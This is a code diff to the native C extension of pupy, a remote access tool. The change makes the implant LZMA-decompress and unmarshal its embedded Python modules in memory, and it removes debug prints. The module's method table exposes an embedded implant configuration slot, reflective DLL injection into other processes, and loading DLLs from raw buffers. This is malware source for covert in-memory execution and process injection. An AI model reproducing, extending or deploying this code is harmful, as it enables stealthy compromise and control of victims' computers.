@@ -6,6 +6,7 @@
 #include "Python-dynload.h"
 #include <stdio.h>
 #include <windows.h>
+#include "LzmaDec.h"
 #include "base_inject.h"
 static char module_doc[] = "Builtins utilities for pupy";
 
@@ -13,9 +14,58 @@ extern const char resources_library_compressed_string_txt_start[];
 extern const int resources_library_compressed_string_txt_size;
 char pupy_config[40960]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
 extern const DWORD dwPupyArch;
-static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
+
+static void *_lzalloc(void *p, size_t size) { p = p; return malloc(size); }
+static void _lzfree(void *p, void *address) { p = p; free(address); }
+ISzAlloc _lzallocator = { _lzalloc, _lzfree };
+
+static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
-	return Py_BuildValue("s#", resources_library_compressed_string_txt_start, resources_library_compressed_string_txt_size);
+	char *uncompressed = NULL;
+	size_t uncompressed_size = 0;
+	PyObject * modules;
+
+	const Byte *wheader = resources_library_compressed_string_txt_start + sizeof(unsigned int);
+	const Byte *woheader = wheader + LZMA_PROPS_SIZE;
+
+	CLzmaDec state;
+	ELzmaStatus status;
+	size_t srcLen;
+	int res;
+
+	union {
+		unsigned int l;
+		unsigned char c[4];
+	} x;
+
+	x.c[3] = resources_library_compressed_string_txt_start[0];
+	x.c[2] = resources_library_compressed_string_txt_start[1];
+	x.c[1] = resources_library_compressed_string_txt_start[2];
+	x.c[0] = resources_library_compressed_string_txt_start[3];
+
+	uncompressed_size = x.l;
+
+	uncompressed = malloc(uncompressed_size);
+	if (!uncompressed) {
+		abort();
+	}
+
+	srcLen = resources_library_compressed_string_txt_size - sizeof(unsigned int) - LZMA_PROPS_SIZE;
+
+	res = LzmaDecode(
+		uncompressed, &uncompressed_size, woheader, &srcLen, wheader,
+		LZMA_PROPS_SIZE, LZMA_FINISH_ANY, &status, &_lzallocator
+	);
+
+	if (res != SZ_OK) {
+		abort();
+	}
+
+	modules = PyMarshal_ReadObjectFromString(
+		uncompressed, uncompressed_size);
+
+	free(uncompressed);
+	return modules;
 }
 
 static PyObject *
@@ -74,21 +124,18 @@ static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
 	const char *lpDllName = NULL;
 	const char *lpFuncName = NULL;
 	void *address = NULL;
-	printf("DEBUG 0: %s %s\n", lpDllName, lpFuncName);
 
 	if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
-		printf("DEBUG: %s %s\n", lpDllName, lpFuncName);
 		address = MyFindProcAddress(lpDllName, lpFuncName);
 	}
 
-	printf("DEBUG 2: %s %s %p\n", lpDllName, lpFuncName, address);
 	return PyLong_FromVoidPtr(address);
 }
 
 static PyMethodDef methods[] = {
 	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
 	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
-	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
+	{ "get_modules", Py_get_modules, METH_NOARGS },
 	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
 	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
 	{ "find_function_address", Py_find_function_address, METH_VARARGS,
